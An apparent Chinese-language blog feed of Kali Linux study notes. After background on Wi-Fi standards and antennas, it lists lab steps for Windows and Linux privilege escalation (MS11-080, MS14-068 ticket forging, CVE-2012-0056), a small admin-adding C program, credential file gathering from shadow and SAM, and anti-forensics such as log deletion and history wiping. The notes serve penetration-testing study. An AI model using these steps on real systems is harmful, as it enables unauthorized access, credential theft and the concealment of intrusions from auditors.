<h4 id="10-802-11g"><a href="#10-802-11g" class="headerlink" title="10. 802.11g"></a>10. 802.11g</h4><ul>
<li>2.4GHz频率</li>
<li>Orthogonal Frequency-Division Multiplexing（OFDM）信号调制方法</li>
<li>与802.11a速率相同</li>
<li>可全局降速 向后兼容802.11b，并切换为CCK信号调制方法</li>
<li>每个信道20/22MHz带宽</li>
</ul>
<h4 id="11-802-11n"><a href="#11-802-11n" class="headerlink" title="11. 802.11n"></a>11. 802.11n</h4><ul>
<li>2.4或5GHz频率<ul>
<li>300Mbps 最高600Mbps</li>
<li>Multiple-Input Multiple-Output（MIMO）多进多出通信技术</li>
<li>多天线，多无线电波，独立收发信号（4条天线）</li>
<li>可以使用40MHz信道带宽使数据传输速率翻倍</li>
</ul>
</li>
<li>全802.11n设备网络中，可以使用新报文格式，使速率达到最大</li>
<li>每个信道20/40MHz带宽</li>
</ul>
<h4 id="12-无线网络运行模式"><a href="#12-无线网络运行模式" class="headerlink" title="12. 无线网络运行模式"></a>12. 无线网络运行模式</h4><ul>
<li>无线网络架构</li>
<li>Infrastructure（基础架构）<ul>
<li>AP维护SSID</li>
</ul>
</li>
<li>Ad-Hoc<ul>
<li>STA 维护SSID</li>
</ul>
</li>
<li>Service Set Identifier（SSID，服务级标识符）<ul>
<li>AP每秒约10次通过Beacon帧广播SSID（Beacon数据包）</li>
<li>客户端连接到无线网络也会宣告SSID</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>有些AP的隐藏是通过不发送Beacon包来形成的</code></pre></blockquote>
<h4 id="13-Infrastruture（基础架构，不存在STA之间的直接通信，需要把信息发给AP）"><a href="#13-Infrastruture（基础架构，不存在STA之间的直接通信，需要把信息发给AP）" class="headerlink" title="13. Infrastruture（基础架构，不存在STA之间的直接通信，需要把信息发给AP）"></a>13. Infrastruture（基础架构，不存在STA之间的直接通信，需要把信息发给AP）</h4><ul>
<li>至少包含一个AP和一个STATION，形成一个Basic Service Set（BSS基本服务集）</li>
<li>AP连接到有线网络，称为Distribution System（DS）</li>
<li>连接到同一个DS的多个AP形成一个Entended Service Set（ESS扩展服务集）</li>
</ul>
<blockquote>
<pre><code>BSS的ID：终端设备连接的网卡AP的MAC地址
ESS的ID：多个AP的SSID保持一致，统一的名字</code></pre></blockquote>
<h4 id="14-AD-HOC（可以用进行STA之间的直接通信）"><a href="#14-AD-HOC（可以用进行STA之间的直接通信）" class="headerlink" title="14. AD-HOC（可以用进行STA之间的直接通信）"></a>14. AD-HOC（可以用进行STA之间的直接通信）</h4><ul>
<li>也被称为Independent Basic Service Set（IBSS独立的基本服务集）</li>
<li>有至少2个STAs直接通信组成</li>
<li>也称为peer to peer模式（点到点模式）</li>
<li>其中一个STA负责AP的工作<ul>
<li>通过beacon广播SSID</li>
<li>对其他STAs进行身份验证</li>
</ul>
</li>
</ul>
<h4 id="15-WIRELESS-DISTRIBUTION-SYSTEM（WDS）"><a href="#15-WIRELESS-DISTRIBUTION-SYSTEM（WDS）" class="headerlink" title="15. WIRELESS DISTRIBUTION SYSTEM（WDS）"></a>15. WIRELESS DISTRIBUTION SYSTEM（WDS）</h4><ul>
<li>与有线DS类视，只是通过无线连接的多个AP组成的网络（没有有线）<ul>
<li>Bridging（桥接）– 只有AP间彼此通信（终端只能连接一个AP）</li>
<li>Repeating（中继）– 允许所有AP和STA进行通信（终端可连接多个AP）</li>
</ul>
</li>
</ul>
<h4 id="16-MONITOR-MODE（无线网络的混杂模式）"><a href="#16-MONITOR-MODE（无线网络的混杂模式）" class="headerlink" title="16. MONITOR MODE（无线网络的混杂模式）"></a>16. MONITOR MODE（无线网络的混杂模式）</h4><ul>
<li>Monitor不是一种真的无线模式<ul>
<li>但是对无线渗透至关重要</li>
<li>允许无线网卡没有任何筛选的抓包</li>
<li>与有线网络的混杂模式可以类比</li>
<li>适合的网卡和驱动不但可以monitor，更可以Injection</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>默认情况下，会过滤掉802.11包头，需要开启Monitor Mode，才能抓到无线的内容</code></pre></blockquote>
<h4 id="17-无线网卡准备"><a href="#17-无线网卡准备" class="headerlink" title="17. 无线网卡准备"></a>17. 无线网卡准备</h4><ul>
<li>物理机运行Kali</li>
<li>虚拟机运行Kali<ul>
<li>外置USB无线网卡（把USB网卡映射给虚拟机）</li>
<li>TL-WAN722N（个人建议）</li>
<li><strong><code>🔺命令：dmesg -T</code></strong>（时间）（显示操作系统硬件级别的变化）</li>
<li><strong><code>🔺命令：iwconfig</code></strong>（查看无线网卡）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>无线渗透网卡芯片选择：ATHEROS</code></pre></blockquote>
<h4 id="18-选择无线网卡"><a href="#18-选择无线网卡" class="headerlink" title="18. 选择无线网卡"></a>18. 选择无线网卡</h4><ul>
<li>这是个痛苦和受挫的过程</li>
<li>无线网卡的芯片型号是成败的关键</li>
<li>台式机<ul>
<li>USBW无线网卡（不支持扩展天线）</li>
<li>PCMCIA（16bit 已停产 802.11b）</li>
<li>Cardbus（32bit PCMCIA 8.0标准）</li>
<li>Express Cards（小的PCI接口）</li>
<li>MiniPCI</li>
<li>MiniPCI Express</li>
<li>PCI接口卡（可外接天线）</li>
</ul>
</li>
<li>发生功率：远程连接（官方出厂限制为20dbm，可外接天线提高范围）</li>
<li>接受灵敏性：适当降低灵敏度，接受效果更佳</li>
<li>经验但不是铁律<ul>
<li>Atheros或Realtek芯片</li>
<li>没有神器</li>
<li>兼容aircrack-ng suite（官网查看兼容的网卡）</li>
</ul>
</li>
<li><a href="http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatible_adapters" target="_blank" rel="noopener">http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatible_adapters</a></li>
<li>无线渗透网卡没有所谓的标准，但是Aircrack-ng suite作者给出建议</li>
<li>Alfa Network AWUS036H<ul>
<li>Realtek 8187芯片</li>
<li>1000mW发生功率</li>
<li>天线：RP-SMA（可扩展）</li>
</ul>
</li>
</ul>
<h4 id="19-无线技术概念"><a href="#19-无线技术概念" class="headerlink" title="19. 无线技术概念"></a>19. 无线技术概念</h4><ul>
<li>分贝dB<ul>
<li>测量无线信号强度</li>
</ul>
</li>
<li>B：向Alexander Graham Bell致敬<ul>
<li>今天大部分声学设备的发明者和理论奠基人</li>
</ul>
</li>
<li>dB：表示2个信号之间的差异比率，用于描述设备的信号强度，是一个相对值</li>
<li>dBm：功率值与1mW进行比较的dB值结果</li>
</ul>
<blockquote>
<pre><code>dB power = 10*log(signal/reference)
10*log(100mW/1mW)=20dBm</code></pre></blockquote>
<ul>
<li>每增加3dB，功率增加约1倍</li>
<li>每增加10dB，功率值增加10倍</li>
<li>dBi：全向天线辐射强度（向所有方向，增益）</li>
<li>dBd：定向天线辐射强度（向固定发向，增大）</li>
</ul>
<h4 id="20-dBi"><a href="#20-dBi" class="headerlink" title="20. dBi"></a>20. dBi</h4><ul>
<li>全向天线的信号功率增益</li>
<li>增益是指定功率强度增加了多少dB</li>
<li>300mW的无线路由器，添加了一个9dBi的天线后功率如何变化<ul>
<li>假设2dBi的电缆和接头耗损</li>
<li>24.8dBi+9dBi-2dBi=31.8dBi</li>
<li>换算为mW功率</li>
<li>10的（31.8dBi/10）次方=10的3.18次方=1513mW</li>
</ul>
</li>
<li>dBm功率相加等于mW功率相乘</li>
</ul>
<h4 id="21-dBd"><a href="#21-dBd" class="headerlink" title="21. dBd"></a>21. dBd</h4><ul>
<li>dBd是定向天香的增益值</li>
<li>全向天线在所有方向上收发信号，定向天线在指定方向的范围内收发信号</li>
<li>天线增益越大信号传输距离越远</li>
<li>既然有mW来表示功率为什么还要引入dB这个单位？<ul>
<li>接收信号时无线信号转变为高频电子脉冲，反之发射信号时高频电子脉冲转换为无线电波，这些过程功率往往要产生上万倍的变化，使用W，mW来计算非常不便，而dBm通过对功率的对数计算，使用一个较小的数值既可以比较直观的表达的功率的变化，因此无线和声学系统都采用了dB这个单位</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>定向天线好处：1.传输范围比较集中，传的更远;2.更安全，防止被破解</code></pre></blockquote>
<h4 id="22-全向天线"><a href="#22-全向天线" class="headerlink" title="22. 全向天线"></a>22. 全向天线</h4><ul>
<li>全向天线波形图<ul>
<li>甜甜圈</li>
</ul>
</li>
<li>天线选择的误区<ul>
<li>增益越高越好（国家严格限制无线通信带宽，打击伪基站）</li>
<li>高功耗</li>
<li>对周围环境的信号干扰</li>
</ul>
</li>
<li>增益过高的全向天线会变成定向天线</li>
</ul>
<blockquote>
<pre><code>5dBi与9dBi全向对比：越往上，范围越奇怪（特别是Vertical方向）</code></pre></blockquote>
<h4 id="23-定向天线"><a href="#23-定向天线" class="headerlink" title="23. 定向天线"></a>23. 定向天线</h4><ul>
<li><strong>双四边形</strong><ul>
<li>定向发送信号</li>
<li>功率相同时，比全向天线传输距离更远（方向正确的情况下）</li>
</ul>
</li>
<li><strong>八木天线：引向发射天线</strong></li>
<li><strong>平面天线</strong></li>
<li><strong>扇形天线</strong><ul>
<li>常用于移动电话网络</li>
<li>3到4个扇形天线联合使用可实现全向信号覆盖</li>
<li>90度扇形天线</li>
</ul>
</li>
<li><strong>120度扇形天线</strong></li>
<li><strong>网状天线</strong><ul>
<li>射束带宽更加集中，功率更强，最远距离更远</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(三十一)：漏洞提权</title>
    <url>/2019/12/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<hr>
<h4 id="1-MS11-080"><a href="#1-MS11-080" class="headerlink" title="1. MS11-080"></a>1. MS11-080</h4><ul>
<li>MS11-080（提权漏洞）<ul>
<li><strong><code>🔺命令：searchploit MS11-080</code></strong></li>
<li><strong><code>🔺命令：cp /usr/share/exploitdb/exploits/windows/local/18176.py</code></strong>（针对32位英文版操作系统）</li>
<li><strong><code>🔺命令：cp 18176.py C:/Python2.7</code></strong></li>
</ul>
</li>
<li>Kb2592799<ul>
<li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>查看升级的补丁：运行 → appwiz.cpl → show updates → remove</code></pre></blockquote>
<ul>
<li>Pywin32<ul>
<li><a href="http://sourceforge.net/projects/pywin32/files/pywin32/Build%%20219/" target="_blank" rel="noopener">http://sourceforge.net/projects/pywin32/files/pywin32/Build%%20219/</a></li>
</ul>
</li>
<li>Pyinstaller（文件夹需要放到Python目录下,18176.c需要放到Pyinstaller文件夹中）<ul>
<li><a href="https://pypi.org/project/PyInstaller/2.1/#files" target="_blank" rel="noopener">https://pypi.org/project/PyInstaller/2.1/#files</a></li>
<li><strong><code>🔺命令：..\python pyinstaller.py --onefile 18176.py</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：18176.exe -O XP</code></strong></li>
<li><strong><code>🔺命令：net localgroup administartor a /add</code></strong>（增加本地账号到管理员组）</li>
</ul>
<h4 id="2-MS11-046（拒绝服务）"><a href="#2-MS11-046（拒绝服务）" class="headerlink" title="2. MS11-046（拒绝服务）"></a>2. MS11-046（拒绝服务）</h4><ul>
<li>Dos</li>
</ul>
<blockquote>
<pre><code>公司若通过域环境管理电脑，统一分配软件和权限，一般安全性很高
在没有安装python环境的机子，可将脚本编译成exe文件（需要Pyinstaller、Pywin32）</code></pre></blockquote>
<h4 id="3-MS14-068"><a href="#3-MS14-068" class="headerlink" title="3. MS14-068"></a>3. MS14-068</h4><ul>
<li>MS14-068（远程漏洞利用）</li>
</ul>
<blockquote>
<pre><code>Windows XP系统利用不成
Windows 7系统利用成功 lab\u1 penbox\w7</code></pre></blockquote>
<ul>
<li>库<ul>
<li><a href="https://github.com/mubix/pykek（ms14-068.py）" target="_blank" rel="noopener">https://github.com/mubix/pykek（ms14-068.py）</a></li>
</ul>
</li>
<li><strong><code>🔺命令：searchexploit ms14-068</code></strong></li>
<li>/usr/share/exploitdb/platforms/windows/remote/35474.py</li>
<li><strong><code>🔺命令：python 35474.py/ms14-068.py -u user@lab.com -s userSID -d dc.lab.com</code></strong> ▲2019.12.22 35473.py/ms14-068.py脚本报错（域控制名称，如果不在域中，只能输入域控制器的IP地址）<ul>
<li>会生成一个TGT文件票据（包含普通用户提升到管理员账号）</li>
</ul>
</li>
<li>输入u1的密码</li>
<li>拷贝<a href="mailto:TGT_user1@lab.com.ccache" target="_blank" rel="noopener">TGT_user1@lab.com.ccache</a>到提权windows系统</li>
<li>本地管理系统<ul>
<li><strong><code>🔺命令：minikatz.exe log &quot;kerberos::ptc TGT user@lab.com.ccache&quot; exit</code></strong></li>
<li>访问管理共享：<strong><code>🔺命令：net use\\完整的域控制器名称\admin$</code></strong></li>
<li>访问域控制器C盘：运行 → \完整的域控制器名称\c$</li>
<li>打开修改注册表：regedit → 连接网络注册表 → 域控制器IP地址 → 账号：<a href="mailto:user1@lab.com" target="_blank" rel="noopener">user1@lab.com</a> 密码</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>域管理：安全边界（有一台计算机作为管理机，可通过一台机器管理所有域内的机器）
服务器升级为域服务器的时候，会自动把Administartor升级为域服务器管理机
搭建域控制器Windows Server2003：
1.配置静态IP地址，DNS服务器指向自己
2.运行域程序的安装：dcpromo（安装过程需要光盘）
3.DNS全名：lab.com
4.分配域账号（无本地用户） → dsa.msc → lab.com → Users → 右键 → 新建普通用户u1 → 设置账户密码（域的密码要复杂，需包含大写字母，小写字母，数字，特殊字符其中三种，且长度长于7个字符）
5.加入域的计算机，在lab.com，Computer可以管理加入域的机器，需要Administrator登陆域接收器关闭防火墙
6.管理加入域的机器，删除域接受器本地的账号，在域接收器本地的Administrator组中加入一个新的u1域的账号，检查名称，u1具有域接收器本地管理员权限，不对其他域机器有管理员权限（可以不设置，为了后面实验）
搭建域接受器Windows XP：
1.准备 → 关闭防火墙 → 配置静态IP地址（DNS指向域控制器）
2.我的电脑 → 右键 → 属性 → 高级系统设置 → 计算机名 → 更改 → 指定域（lab.com）
3.共享资源\\lab.com
5.获取SID： 通过whoami /all 查看域的SID
6.net view：查看域控制器完整名称</code></pre></blockquote>
<h4 id="4-CVE-2012-0056"><a href="#4-CVE-2012-0056" class="headerlink" title="4. CVE-2012-0056"></a>4. CVE-2012-0056</h4><ul>
<li>Ubuntu11.10<ul>
<li><a href="http://old-releases.ubuntu.com/releases/11.10" target="_blank" rel="noopener">http://old-releases.ubuntu.com/releases/11.10</a></li>
<li><strong><code>🔺命令：searchexploit 18411.c</code></strong>（Kali上）</li>
<li>Linux之间拷贝文件: <strong><code>🔺命令：SCP 文件 账号@IP地址：存放路径</code></strong>（通过SSH隧道，Kali端）</li>
</ul>
</li>
<li>gcc（exploit-db/searchexploit都有存在EXP） <ul>
<li><strong><code>🔺命令：mount /dev/cdrom /media/cdrom</code></strong>（挂载CD光盘设备）</li>
<li><strong><code>🔺命令：sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc</code></strong>（ubuntu停止安装更新源）</li>
<li><strong><code>🔺命令：sudo apt-get install openssh-server</code></strong></li>
<li><strong><code>🔺命令：gcc 18411.c -o exp</code></strong></li>
</ul>
</li>
<li>CVE-2012-0056（操作系统内核对用户进程控制权限不严格）<ul>
<li>/proc/pid/mem</li>
<li>kernels&lt;=2.6.39</li>
<li><a href="http://blog.zx2c4.com/749（漏洞详细原理）" target="_blank" rel="noopener">http://blog.zx2c4.com/749（漏洞详细原理）</a></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>/proc目录：内存中生成的临时/proc，保存了内存的实时数据，每生成一个进程，对应分配的PID，都会在这里创建一个目录
Ubuntu下：id查看当前用户信息
#：root用户提示符；$：普通用户提示符</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(三十三)：收集信息与隐蔽痕迹</title>
    <url>/2019/12/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%89)%EF%BC%9A%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF%E4%B8%8E%E9%9A%90%E8%94%BD%E7%97%95%E8%BF%B9/</url>
    <content><![CDATA[<hr>
<h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h4><ul>
<li>应用系统的配置文件<ul>
<li>应用连接数据库的配置文件</li>
<li>后台服务运行账户</li>
</ul>
</li>
</ul>
<h4 id="2-基本信息收集"><a href="#2-基本信息收集" class="headerlink" title="2. 基本信息收集"></a>2. 基本信息收集</h4><ul>
<li>Linux<ul>
<li>/etc/resolv.conf（DNS信息）</li>
<li>/etc/passwd（存了用户账号和密码）</li>
<li>/etc/shadow（存放的密码信息）</li>
<li><strong><code>🔺命令：whoami,who -a</code></strong></li>
<li><strong><code>🔺命令：ifconfig -a，iptables -L -n，netstat -rn</code></strong></li>
<li><strong><code>🔺命令：uname -a，ps aux</code></strong></li>
<li><strong><code>🔺命令：dpkg -l | head</code></strong>（rc–remove+配置文件保存）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>/etc/passwd   -rw-r--r--
/etc/shadow   -rw-r-----</code></pre></blockquote>
<ul>
<li>Windows<ul>
<li><strong><code>🔺命令：ipconfig /all,ipconfig /displaydns（DNS缓存）,netstat -bnao,netstat -r（查询路由）</code></strong></li>
<li><strong><code>🔺命令：net view,net view /domain（网络共享信息）</code></strong></li>
<li><strong><code>🔺命令：net user /domain,net user %username% /domain</code></strong>（域环境的信息）</li>
<li><strong><code>🔺命令：net accounts,net share</code></strong>（机器开的共享）</li>
<li><strong><code>🔺命令：net localgroup administrator username /add</code></strong>（加入管理员组）</li>
<li><strong><code>🔺命令：net group &quot;Domain Controllers&quot; /domain</code></strong>（查看域控制器的主机账号）</li>
<li><strong><code>🔺命令：net share name$=C:\ /unlimited</code></strong>（域控制器的共享）</li>
<li><strong><code>🔺命令：net user username /active:yes /domain</code></strong>（域管理员启动锁定的账号）</li>
</ul>
</li>
</ul>
<h4 id="3-WMIC（WINDOWS-MANAGEMENT-INSTRUMENTATION）"><a href="#3-WMIC（WINDOWS-MANAGEMENT-INSTRUMENTATION）" class="headerlink" title="3. WMIC（WINDOWS MANAGEMENT INSTRUMENTATION）"></a>3. WMIC（WINDOWS MANAGEMENT INSTRUMENTATION）</h4><ul>
<li><strong><code>🔺命令：wmic nicconfig get ipaddress,macaddress</code></strong>（读取IP地址，MAC地址）</li>
<li><strong><code>🔺命令：wmic computersystem get username</code></strong>（当前登陆用户账号）</li>
<li><strong><code>🔺命令：wmic netlogin get name,lastcalclogon</code></strong>（查看用户登陆记录，通过网络login）</li>
<li><strong><code>🔺命令：wmic process get caption,executablepath,commandline</code></strong>（查看当前进程信息，由哪些命令执行，执行程序的路径）</li>
<li><strong><code>🔺命令：wmic process where name=&quot;calc.exe&quot; call terminate</code></strong>（结束一个进程）</li>
<li><strong><code>🔺命令：wmic os get name,servicepackmajorversion</code></strong>（提取操作系统版本，补丁）</li>
<li><strong><code>🔺命令：wmic product get name,version</code></strong>（查看当前操作系统安装的软件）</li>
<li><strong><code>🔺命令：wmic product where name=&quot;name&quot; call uninstall /nointeractive</code></strong>（删除软件，静默的去删除）</li>
<li><strong><code>🔺命令：wmic share get /ALL</code></strong>（查看共享文件夹）</li>
<li><strong><code>🔺命令：wmic /node:&quot;machinename&quot; path Win32_TerminalServiceSetting where AllowTSConnections=&quot;0&quot; call SetAllowTSConnections &quot;1&quot;</code></strong>（开启远程桌面） ▲ 2019.12.21 Win10的RPC服务器不可用，可在系统属性 → 远程中开启远程协助</li>
<li><strong><code>🔺命令：wmic nteventlog get</code></strong> path,filename,writeable（查看当前系统日志对应操作系统文件）</li>
</ul>
<blockquote>
<pre><code>查看操作系统日志：运行 → eventvwr</code></pre></blockquote>
<h4 id="5-收集敏感信息"><a href="#5-收集敏感信息" class="headerlink" title="5. 收集敏感信息"></a>5. 收集敏感信息</h4><ul>
<li>商业信息</li>
<li>系统信息</li>
<li>Linux<ul>
<li>/etc；/usr/local/etc</li>
<li>/etc/passwd；/etc/shadow</li>
<li>.ssh；.gnupg 公私钥（默认隐藏文件）</li>
<li>The e-mail and data files</li>
<li>业务数据库：身份认证服务数据库</li>
<li>/tmp</li>
</ul>
</li>
<li>Windows<ul>
<li>SAM数据库；注册表文件</li>
<li>%SYSTEMROOT%\repair\SAM（SAM数据库备份）</li>
<li>%SYSTEMROOT%\System32\config\RegBack\SAM（SAM数据库备份）</li>
<li>业务数据库：身份认证数据库</li>
<li>临时文件目录<ul>
<li>UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="6-隐藏痕迹"><a href="#6-隐藏痕迹" class="headerlink" title="6. 隐藏痕迹"></a>6. 隐藏痕迹</h4><ul>
<li>Windows<ul>
<li>禁止在登陆界面显示新建账号</li>
<li><strong><code>🔺命令：REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindosNT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v uname（要隐藏的账号名）/T REG_DWORD /D 0</code></strong> ▲ 2019.12.21 Win10命令可以执行，但未禁止</li>
<li>del %WINDIR%*.log /a/s/q/f（强制安静不留痕迹删除）</li>
</ul>
</li>
<li>Linux<ul>
<li><strong><code>🔺命令：history</code></strong>（重点关注，查看曾经运行的命令）</li>
</ul>
</li>
</ul>
<blockquote>
<p>   history -c（擦除history之前的命令）<br>   lsattr（查看权限相关文件的属性）</p>
<ul>
<li>rm .bash_history &amp;&amp; chattr +i .bash_history（文件名）（文件不能再写入）</li>
</ul>
</blockquote>
<blockquote>
<pre><code>history存在内存中，关机即删除
.bash_history存在硬盘，关机不删除</code></pre></blockquote>
<ul>
<li>日志（/var/log）<ul>
<li>auth.log/secure</li>
<li>btmp/wtmp（数据文件，不能直接查看，通过<strong><code>🔺命令：lastb/last</code></strong>查看文件）</li>
<li><strong><code>🔺命令：lastlog/faillog</code></strong></li>
</ul>
</li>
<li>其他日志和HIDS等 </li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(三十二)：配置不当提权</title>
    <url>/2019/12/22/Kali%20Linnx%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%BA%8C)%EF%BC%9A%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<hr>
<h4 id="1-利用配置不当提权"><a href="#1-利用配置不当提权" class="headerlink" title="1. 利用配置不当提权"></a>1. 利用配置不当提权</h4><ul>
<li>与漏洞提权相比更常用的方法<ul>
<li>企业环境</li>
<li>补丁更新的全部已经安装（有一定的安装策略）</li>
<li>输入变量过滤之外更值得研发关注的安全隐患</li>
<li>以system权限启动（查看system权限执行的服务）</li>
<li>NTFS权限允许users修改删除</li>
</ul>
</li>
</ul>
<h4 id="2-利用配置不当提权"><a href="#2-利用配置不当提权" class="headerlink" title="2. 利用配置不当提权"></a>2. 利用配置不当提权</h4><ul>
<li>icacls<ul>
<li>icacls 文件（查看文件NTFS权限）</li>
<li><strong><code>🔺命令：icacls c:\windows\*.exe /save perm（文件名） /T</code></strong>（所有满足条件的文件）</li>
<li><strong><code>🔺命令：i686-w64-mingw32-gcc -o admin.exe admin.c</code></strong></li>
</ul>
</li>
</ul>
<pre><code>#include&lt;stdlib.h&gt;
int main()
{
  int i;
  i=system(&quot;net localgroup administrators a add/&quot;);
  return 0;
}</code></pre><blockquote>
<pre><code>BU：基本用户（若存在权限为FA，即为所要找的文件）
PU：普通用户
BA：管理员账户</code></pre></blockquote>
<ul>
<li>Window2 2003<ul>
<li><strong><code>🔺命令：net user a /add</code></strong></li>
<li><strong><code>🔺命令：net user a</code></strong></li>
<li>CamView添加user完全控制文件</li>
<li>拷贝到admin.exe到软件运行目录下，修改名称为原来执行文件的名称</li>
<li>删除原来执行文件或者改名</li>
</ul>
</li>
<li>Find<ul>
<li><strong><code>🔺命令：find / -perm 777 -exec ls -l {}（前面所搜到的结果） \;</code></strong></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(三十)：本地提权（WINDOWS）</title>
    <url>/2019/12/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81)%EF%BC%9A%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<hr>
<h4 id="1-本地提权"><a href="#1-本地提权" class="headerlink" title="1. 本地提权"></a>1. 本地提权</h4><ul>
<li>已实现本地低权限账号登录<ul>
<li>远程溢出</li>
<li>直接获得账号密码</li>
</ul>
</li>
<li>希望获取更高权限<ul>
<li>实现对目标进一步控制</li>
</ul>
</li>
</ul>
<h4 id="2-本地提权"><a href="#2-本地提权" class="headerlink" title="2. 本地提权"></a>2. 本地提权</h4><ul>
<li>系统账号之间权限隔离（系统账号和应用程序账号）<ul>
<li>操作系统安全的基础</li>
<li>用户空间</li>
<li>内核空间</li>
</ul>
</li>
<li>系统账号<ul>
<li>用户账号登陆时获取权限令牌（每次生成的令牌都有随机数）</li>
<li>服务账号无需用户登陆已在后台启动服务</li>
</ul>
</li>
</ul>
<h4 id="4-本地提权"><a href="#4-本地提权" class="headerlink" title="4. 本地提权"></a>4. 本地提权</h4><ul>
<li>Windows<ul>
<li>User</li>
<li>Administrator</li>
<li>System（启动运行系统内核级别的权限，真正有最大权限的账号）</li>
</ul>
</li>
<li>Linux<ul>
<li>User</li>
<li>Root</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Windows下，User权限包含在Administrator，System有Administrator所没有的权限，Administrator有System所没有的权限</code></pre></blockquote>
<h4 id="5-ADMIN提权为SYSTEM"><a href="#5-ADMIN提权为SYSTEM" class="headerlink" title="5. ADMIN提权为SYSTEM"></a>5. ADMIN提权为SYSTEM</h4><ul>
<li>Windows system账号<ul>
<li>系统设置管理功能</li>
<li>SysInternal Suit</li>
</ul>
</li>
</ul>
<blockquote>
<p>   <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/</a><br>   psexec.exe -i -s -d taskmgr<br>   psexec.exe -i -s cmd<br>   需要一个whoami的工具，需要放到Window下的System32根目录下</p>
</blockquote>
<ul>
<li>Windows XP下   <ul>
<li><strong><code>🔺命令：at 稍后的时间 /interactive cmd</code></strong></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>在Windows XP下：
切换权限：taskmgr → explorer（图形化kill）→ 文件 → explorer</code></pre></blockquote>
<ul>
<li>Windows 7 or 8下 ▲ 2019.12.17 [SC] OpenSCManager失败：5<ul>
<li><strong><code>🔺命令：sc Create syscmd（服务名称） binPath=&quot;cmd /K start&quot; type=own type=interact</code></strong></li>
<li><strong><code>🔺命令：sc start syscmd</code></strong></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>在Windows 7 or 8下：
service.msc，创建System服务进程
需要一个whoami的工具，需要放到Window下的System32根目录下</code></pre></blockquote>
<blockquote>
<pre><code>HelpAssistant账号为远程协助账号，允许别人的远程连接
图形化界面：我的电脑 → 计算机管理 → 本地用户和组 → 用户/组
修改密码：net user 用户名 *
查看账号：net user
查看账户权限：net user 账号名称（关注所属组）</code></pre></blockquote>
<h4 id="6-注入进程提权"><a href="#6-注入进程提权" class="headerlink" title="6. 注入进程提权"></a>6. 注入进程提权</h4><ul>
<li>隐蔽痕迹</li>
<li><strong><code>🔺命令：pinjector.exe</code></strong><ul>
<li><a href="http://www.tarasco.org/security/Process_Injector" target="_blank" rel="noopener">http://www.tarasco.org/security/Process_Injector</a></li>
</ul>
</li>
<li><strong><code>🔺命令：pinjector.exe -p PID的值 cmd 指定端口</code></strong>  </li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(二十九)：后漏洞利用阶段</title>
    <url>/2019/12/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%90%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5/</url>
    <content><![CDATA[<hr>
<h4 id="1-选择和修改EXP"><a href="#1-选择和修改EXP" class="headerlink" title="1. 选择和修改EXP"></a>1. 选择和修改EXP</h4><ul>
<li>网上公开的EXP代码<ul>
<li>选择可信赖的EXP源（存在恶意黑客编造假的EXP，因为Shellcode都是十六进制）</li>
<li>Exploit-db（官方维护的漏洞溢出代码库）</li>
<li>SecurityFocus</li>
<li>Searchsploit</li>
<li>有能力修改EXP（Python、Perl、Ruby、C、C++….）</li>
</ul>
</li>
</ul>
<h4 id="2-选择和修改EXP"><a href="#2-选择和修改EXP" class="headerlink" title="2. 选择和修改EXP"></a>2. 选择和修改EXP</h4><ul>
<li>646.c<ul>
<li>类Unix环境下编译</li>
<li>返回地址与我们的环境不止</li>
<li>反弹shell硬编码了回连IP地址</li>
<li>缓冲区偏移量与我们环境不符</li>
